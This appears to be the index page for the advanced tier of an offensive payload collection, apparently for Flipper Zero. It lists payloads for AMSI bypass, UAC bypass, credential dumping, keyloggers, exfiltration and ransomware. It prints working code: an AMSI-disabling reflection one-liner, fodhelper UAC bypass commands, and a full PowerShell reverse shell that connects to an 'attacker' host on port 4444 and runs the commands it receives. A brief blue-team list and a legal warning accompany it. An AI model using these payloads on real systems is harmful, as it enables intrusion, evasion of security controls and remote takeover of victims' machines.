# Advanced Level Scripts (FZ-A01 to FZ-A10)

## Overview

Advanced scripts combine multiple techniques into sophisticated attack chains. These payloads implement evasion, exfiltration, and complete compromise scenarios.

### Skill Level Characteristics
- **Code Length**: 60-150+ lines
- **Purpose**: Complete attack objectives
- **Visibility**: Evasion-focused, minimal traces
- **Risk**: Full system compromise potential
- **Timing**: Dynamic, condition-based execution

---

## Payload Index

| ID | Name | Target | Description |
|----|------|--------|-------------|
| [FZ-A01](FZ-A01_AMSI_Bypass.md) | AMSI Bypass | Windows | Bypass Antimalware Scan Interface |
| [FZ-A02](FZ-A02_UAC_Bypass.md) | UAC Bypass | Windows | Bypass User Account Control |
| [FZ-A03](FZ-A03_Credential_Dumping.md) | Credential Dumping | Windows | Extract credentials (Mimikatz-style) |
| [FZ-A04](FZ-A04_Reverse_Shell.md) | Reverse Shell | Multi | Establish reverse shell connection |
| [FZ-A05](FZ-A05_Data_Exfiltration.md) | Data Exfiltration | Multi | Exfiltrate data via multiple channels |
| [FZ-A06](FZ-A06_Keylogger.md) | Keylogger | Windows | Capture keystrokes |
| [FZ-A07](FZ-A07_Screenshot_Capture.md) | Screenshot Capture | Multi | Capture and exfil screenshots |
| [FZ-A08](FZ-A08_AD_Enumeration.md) | Active Directory Enum | Windows | Domain reconnaissance |
| [FZ-A09](FZ-A09_Complete_Attack_Chain.md) | Complete Attack Chain | Windows | Full attack workflow |
| [FZ-A10](FZ-A10_Ransomware_Simulation.md) | Ransomware Simulation | Windows | Educational ransomware demo |

---

## Key Concepts Introduced

### AMSI Bypass Techniques

```powershell
# Memory patching (educational)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### UAC Bypass Methods

```powershell
# Fodhelper bypass
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
Start-Process "fodhelper.exe"
```

### Reverse Shells

```powershell
# PowerShell reverse shell
$c = New-Object System.Net.Sockets.TCPClient('attacker',4444)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b,0,$b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)
    $r = (iex $d 2>&1 | Out-String)
    $r2 = $r + 'PS ' + (pwd).Path + '> '
    $sb = ([text.encoding]::ASCII).GetBytes($r2)
    $s.Write($sb,0,$sb.Length)
}
```

### Data Exfiltration Channels

| Channel | Stealth | Speed | Detection Risk |
|---------|---------|-------|----------------|
| HTTPS POST | High | Fast | Medium |
| DNS Exfil | Very High | Slow | Low |
| ICMP Tunnel | High | Slow | Low |
| Email | Medium | Medium | Medium |
| Cloud Storage | High | Fast | Medium |

---

## Platform Coverage

| Platform | Payloads |
|----------|----------|
| Windows | FZ-A01 through FZ-A10 |
| macOS | FZ-A04, FZ-A05, FZ-A07 (variants) |
| Linux | FZ-A04, FZ-A05, FZ-A07 (variants) |

---

## Learning Objectives

After completing Advanced scripts:
- [ ] Bypass Windows security controls (AMSI, UAC)
- [ ] Establish persistent remote access
- [ ] Exfiltrate data through covert channels
- [ ] Perform credential harvesting
- [ ] Execute complete attack chains
- [ ] Understand ransomware mechanics (defensive)

---

## Red Team Focus

Advanced techniques for real-world scenarios:
- **Evasion**: Bypassing security controls
- **Persistence**: Multiple fallback methods
- **Credential Access**: Dumping and harvesting
- **Exfiltration**: Covert data transfer
- **Impact**: Understanding destructive capabilities

---

## Blue Team Focus

Detection and response at advanced level:
- Monitor for AMSI tampering
- Detect UAC bypass attempts
- Identify credential dumping tools
- Network traffic analysis for exfiltration
- Behavioral analysis for attack chains

---

## ⚠️ Legal and Ethical Warning

Advanced payloads can cause significant harm if misused. These techniques should **ONLY** be used:
- In authorized penetration testing engagements
- In isolated lab environments
- For defensive security research
- With explicit written permission

Unauthorized use may violate:
- Computer Fraud and Abuse Act (CFAA)
- General Data Protection Regulation (GDPR)
- Local computer crime laws
- Employment agreements

---

[← Intermediate Scripts](../03_Intermediate_Scripts/) | [Next: FZ-A01 AMSI Bypass →](FZ-A01_AMSI_Bypass.md)
